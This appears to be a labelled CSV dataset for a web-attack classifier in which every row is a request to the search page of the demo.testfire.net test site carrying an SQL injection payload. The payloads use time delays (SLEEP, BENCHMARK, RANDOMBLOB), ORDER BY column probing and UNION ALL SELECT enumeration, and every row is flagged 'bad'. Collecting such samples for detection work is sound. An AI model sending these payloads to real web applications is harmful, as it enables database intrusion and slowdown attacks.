path,content,host,class_flag
/search.jsp?query=ORDER BY SLEEP(5)--,,demo.testfire.net,['bad']
/search.jsp?query=ORDER BY SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=(SELECT * FROM (SELECT(SLEEP(5)))ecMj),,demo.testfire.net,['bad']
/search.jsp?query=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,,demo.testfire.net,['bad']
/search.jsp?query=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#,,demo.testfire.net,['bad']
"/search.jsp?query=+benchmark(3200,SHA1(1))+'",,demo.testfire.net,['bad']
/search.jsp?query=+ SLEEP(10) + ',,demo.testfire.net,['bad']
/search.jsp?query=RANDOMBLOB(500000000/2),,demo.testfire.net,['bad']
"/search.jsp?query=AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",,demo.testfire.net,['bad']
"/search.jsp?query=OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",,demo.testfire.net,['bad']
/search.jsp?query=RANDOMBLOB(1000000000/2),,demo.testfire.net,['bad']
"/search.jsp?query=AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",,demo.testfire.net,['bad']
"/search.jsp?query=OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",,demo.testfire.net,['bad']
"/search.jsp?query=SLEEP(1)/*' or SLEEP(1) or '"" or SLEEP(1) or ""*/",,demo.testfire.net,['bad']
/search.jsp?query=ORDER BY SLEEP(5),,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5)",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY SLEEP(5)#,,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5)#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),3#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),3,4#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY SLEEP(5)-- ,,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5)-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),3-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),3,4-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ",,demo.testfire.net,['bad']
"/search.jsp?query= ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- ",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT 1,,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2#",,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT 1#,,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",,demo.testfire.net,['bad']
"/search.jsp?query= UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",,demo.testfire.net,['bad']
